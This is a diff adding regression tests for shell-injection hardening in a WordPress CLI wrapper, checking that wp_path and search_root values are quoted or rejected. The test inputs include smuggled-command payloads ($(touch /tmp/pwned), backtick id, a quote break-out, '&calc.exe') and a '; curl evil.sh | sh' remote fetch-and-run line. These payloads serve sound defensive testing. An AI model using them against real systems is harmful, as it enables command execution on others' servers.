@@ -1,3 +1,4 @@
+import shlex
 import unittest
 from unittest.mock import MagicMock, patch
 import json
@@ -19,7 +20,8 @@ class TestWPCLI(unittest.TestCase):
     def test_get_cd_prefix_unix(self, mock_is_windows):
         mock_is_windows.return_value = False
         prefix = self.wp_cli._get_cd_prefix()
-        self.assertEqual(prefix, 'cd "/var/www/html" && ')
+        # shlex.quote leaves a metacharacter-free path bare.
+        self.assertEqual(prefix, 'cd /var/www/html && ')
 
     @patch("src.wp.cli.WPCLI._is_windows_local")
     def test_get_cd_prefix_windows(self, mock_is_windows):
@@ -162,3 +164,72 @@ class TestWPCLI(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class TestShellInjectionHardening(unittest.TestCase):
+    """
+    Regression tests for the command-injection fixes: wp_path and search_root
+    both reach a shell (subprocess(shell=True) locally, exec_command over SSH),
+    so neither may be interpolated raw.
+    """
+
+    def setUp(self):
+        self.mock_executor = MagicMock()
+        self.mock_executor.execute.return_value = CommandResult(
+            exit_code=0, stdout="", stderr="", success=True
+        )
+
+    @patch("src.wp.cli.WPCLI._is_windows_local")
+    def test_wp_path_command_substitution_is_neutralised(self, mock_is_windows):
+        mock_is_windows.return_value = False
+        malicious = "/var/www/$(touch /tmp/pwned)"
+        cli = WPCLI(self.mock_executor, malicious)
+        prefix = cli._get_cd_prefix()
+        # Parse the way a shell would: the payload must survive as a single
+        # literal argument to cd, not as separate words or a substitution.
+        tokens = shlex.split(prefix.removesuffix("&& "))
+        self.assertEqual(tokens, ["cd", malicious])
+
+    @patch("src.wp.cli.WPCLI._is_windows_local")
+    def test_wp_path_backtick_is_neutralised(self, mock_is_windows):
+        mock_is_windows.return_value = False
+        cli = WPCLI(self.mock_executor, "/var/www/`id`")
+        prefix = cli._get_cd_prefix()
+        tokens = shlex.split(prefix.removesuffix("&& "))
+        self.assertEqual(tokens, ["cd", "/var/www/`id`"])
+
+    @patch("src.wp.cli.WPCLI._is_windows_local")
+    def test_wp_path_quote_break_out_is_neutralised(self, mock_is_windows):
+        mock_is_windows.return_value = False
+        malicious = '/var/www"; id; echo "'
+        cli = WPCLI(self.mock_executor, malicious)
+        prefix = cli._get_cd_prefix()
+        # The `"` must not terminate quoting and start a second command.
+        tokens = shlex.split(prefix.removesuffix("&& "))
+        self.assertEqual(tokens, ["cd", malicious])
+
+    @patch("src.wp.cli.WPCLI._is_windows_local")
+    def test_windows_wp_path_with_metacharacters_is_rejected(self, mock_is_windows):
+        mock_is_windows.return_value = True
+        cli = WPCLI(self.mock_executor, 'C:\www&calc.exe')
+        with self.assertRaises(ValueError):
+            cli._get_cd_prefix()
+
+    @patch("src.wp.cli.WPCLI._is_windows_local")
+    def test_search_root_injection_is_neutralised(self, mock_is_windows):
+        mock_is_windows.return_value = False
+        cli = WPCLI(self.mock_executor, "/var/www/html")
+        cli.scan_server_sites(search_root="/tmp; curl evil.sh | sh")
+        issued = self.mock_executor.execute.call_args[0][0]
+        self.assertIn("find ", issued)
+        # The injected command must be inside quotes, not a separate command.
+        self.assertNotIn("; curl evil.sh | sh -maxdepth", issued)
+        self.assertIn("'/tmp; curl evil.sh | sh'", issued)
+
+    @patch("src.wp.cli.WPCLI._is_windows_local")
+    def test_search_root_unset_still_expands_home(self, mock_is_windows):
+        mock_is_windows.return_value = False
+        cli = WPCLI(self.mock_executor, "/var/www/html")
+        cli.scan_server_sites(search_root=None)
+        issued = self.mock_executor.execute.call_args[0][0]
+        self.assertIn("find $HOME -maxdepth", issued)
